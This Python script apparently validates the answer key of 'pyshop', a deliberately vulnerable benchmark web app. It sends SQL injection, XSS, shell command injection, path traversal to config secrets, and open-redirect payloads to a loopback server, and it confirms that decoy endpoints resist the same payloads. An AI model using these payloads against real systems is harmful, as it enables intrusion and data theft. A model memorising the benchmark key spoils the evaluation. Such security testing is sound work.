"""Proves pyshop's answer key is true by exploiting each bug and attacking each decoy.

Only ever talks to pyshop on loopback, using payloads that don't change anything outside the container.
Start it first: docker compose -f benchmarks/pyshop/docker-compose.yml up -d --build
"""
from __future__ import annotations

import http.client
import json
import sys
import time
import urllib.parse

HOST, PORT = "127.0.0.1", 8089
EVIL = "http://evil.test/forge-pyshop"
EVIL_WITH_NAME = "http://evil.test/pyshop"


def request(method, path, params=None, body=None, headers=None):
    """Returns (status, headers, text, seconds). `params` go in the query for GET and the form for POST."""
    query = urllib.parse.urlencode(params or {})
    conn = http.client.HTTPConnection(HOST, PORT, timeout=30)
    started = time.time()
    sent = dict(headers or {})
    if body is not None:
        sent["Content-Type"] = "application/json"
        conn.request(method, path, json.dumps(body), sent)
    elif method == "GET":
        conn.request("GET", f"{path}?{query}" if query else path, headers=sent)
    else:
        sent["Content-Type"] = "application/x-www-form-urlencoded"
        conn.request(method, path, query, sent)
    res = conn.getresponse()
    text = res.read().decode("utf-8", "replace")
    return res.status, dict(res.getheaders()), text, time.time() - started


def body_has(text):
    return lambda status, headers, body, took: text in body


def body_lacks(text):
    return lambda status, headers, body, took: text not in body


def redirects(target):
    return lambda status, headers, body, took: status in (301, 302, 303, 307, 308) and headers.get("Location") == target


def status_is(code):
    return lambda status, headers, body, took: status == code


def quoted(text):
    return urllib.parse.quote(text, safe="")


# id, method, path, params, JSON body, check
BUGS = [
    ("S1", "GET", "/api/orders", {"customer": "zz' OR 1=1 -- "}, None, body_has("bob")),
    ("S2", "GET", "/products/search", {"q": "zz' OR 1=1 -- "}, None, body_has("Anvil")),
    ("S4", "POST", "/auth/login", {"username": "ada' -- ", "password": "x"}, None, status_is(302)),
    ("S6", "GET", f"/products/by-category/{quoted(chr(122) + chr(39) + ' OR 1=1 -- ')}", None, None, body_has("Anvil")),
    ("X1", "GET", "/search", {"q": "<script>x1</script>"}, None, body_has("<script>x1</script>")),
    ("X3", "POST", "/contact", {"name": "' onmouseover='x3"}, None, body_has("value='' onmouseover='x3'")),
    ("X4", "GET", "/gallery", {"img": "x onerror=x4"}, None, body_has("<img src=x onerror=x4>")),
    ("X5", "GET", "/preview", {"title": "<script>x5</script>"}, None, body_has("<script>x5</script>")),
    ("C1", "POST", "/tools/ping", {"host": "127.0.0.1; echo c1$((6*7))"}, None, body_has("c142")),
    ("C2", "GET", "/tools/lookup", {"domain": "x; echo c2$((6*7))"}, None, body_has("c242")),
    ("C3", "GET", "/api/convert", {"format": "png; echo c3$((6*7))"}, None, body_has("c342")),
    ("C4", "POST", "/admin/backup", None, {"label": "x$(sleep 2)"}, lambda s, h, b, took: took >= 2),
    ("P1", "GET", "/files/download", {"file": "../../config.py"}, None, body_has("SECRET_KEY")),
    ("P2", "GET", "/pages", {"name": "../notes"}, None, body_has("INTERNAL-NOTE-2")),
    ("P3", "GET", "/files/invoice", {"id": "....//....//config.py"}, None, body_has("SECRET_KEY")),
    ("P4", "GET", "/api/attachments", {"name": "../../config.py"}, None, status_is(200)),
    ("R1", "GET", "/go", {"url": EVIL}, None, redirects(EVIL)),
    ("R2", "GET", "/auth/logout", {"next": EVIL}, None, redirects(EVIL)),
    ("R3", "POST", "/cart/checkout", {"back": EVIL}, None, redirects(EVIL)),
    ("R4", "GET", "/lang", {"back": EVIL_WITH_NAME}, None, redirects(EVIL_WITH_NAME)),
]

DECOYS = [
    ("D1", "GET", "/api/orders/1 OR 1=1", None, None, body_lacks("bob")),
    ("D2", "GET", "/products/1 OR 1=1", None, None, body_lacks("Anvil")),
    ("D3", "GET", "/profile", {"name": "<script>d3</script>"}, None, body_lacks("<script>d3")),
    ("D4", "GET", "/tools/dns", {"host": "x; echo d4$((6*7))"}, None, body_lacks("d442")),
    ("D5", "GET", "/files/report", {"name": "../../config.py"}, None, body_lacks("SECRET_KEY")),
    ("D6", "GET", "/welcome", {"next": EVIL}, None, redirects("/")),
    ("D7", "GET", "/export", {"q": "<script>d7</script>"}, None,
     lambda s, h, b, took: h.get("Content-Type", "").startswith("text/csv")),
    ("D8", "GET", "/products", {"sort": "name; DROP TABLE products"}, None, body_has("Hammer")),
    ("D14", "GET", "/api/orders", {"customer": "<script>d14</script>"}, None,
     lambda s, h, b, took: h.get("Content-Type", "").startswith("application/json")),
]


def check(item) -> bool:
    name, method, path, params, body, passed = item
    result = request(method, path.replace(" ", "%20"), params, body)
    ok = passed(*result)
    print(f"  {'ok  ' if ok else 'FAIL'} {name} {method} {path}")
    return ok


def differential(name, first, second, want_first, want_second) -> bool:
    """A bare 500 for a lone quote and a normal answer for a paired one: the query is being built from the input."""
    a, b = first(), second()
    ok = a[0] == want_first and b[0] == want_second
    print(f"  {'ok  ' if ok else 'FAIL'} {name} (status {a[0]} then {b[0]})")
    return ok


def main() -> int:
    print("Bugs that must be exploitable:")
    results = [check(item) for item in BUGS]
    results.append(differential(
        "S3 POST /api/orders (JSON body)",
        lambda: request("POST", "/api/orders", body={"customer": "s3", "item": "'"}),
        lambda: request("POST", "/api/orders", body={"customer": "s3", "item": "''"}), 500, 201))
    results.append(differential(
        "S5 GET /api/orders/summary",
        lambda: request("GET", "/api/orders/summary", {"sort": "no_such_column"}),
        lambda: request("GET", "/api/orders/summary", {"sort": "status"}), 500, 200))
    request("POST", "/products/1/reviews", {"body": "<script>x2</script>"})
    results.append(check(("X2", "GET", "/products/1", None, None, body_has("<script>x2</script>"))))
    print("Decoys that must hold:")
    results += [check(item) for item in DECOYS]
    print("Runtime-only weaknesses that must be present:")
    _, headers, _, _ = request("GET", "/")
    login = request("POST", "/auth/login", {"username": "ada' -- ", "password": "x"})
    cookie = login[1].get("Set-Cookie", "")
    runtime = [
        ("H1 no Content-Security-Policy", "Content-Security-Policy" not in headers),
        ("H2 no X-Frame-Options", "X-Frame-Options" not in headers),
        ("H3 sid cookie without HttpOnly", "sid=" in cookie and "httponly" not in cookie.lower()),
        ("H4 X-Powered-By exposes versions", "Flask/" in headers.get("X-Powered-By", "")),
        ("H5 Server names the application server", "gunicorn" in headers.get("Server", "").lower()),
        ("H6 Access-Control-Allow-Origin: *", headers.get("Access-Control-Allow-Origin") == "*"),
    ]
    for label, ok in runtime:
        print(f"  {'ok  ' if ok else 'FAIL'} {label}")
        results.append(ok)
    print(f"{sum(results)}/{len(results)} checks passed")
    return 0 if all(results) else 1


if __name__ == "__main__":
    sys.exit(main())
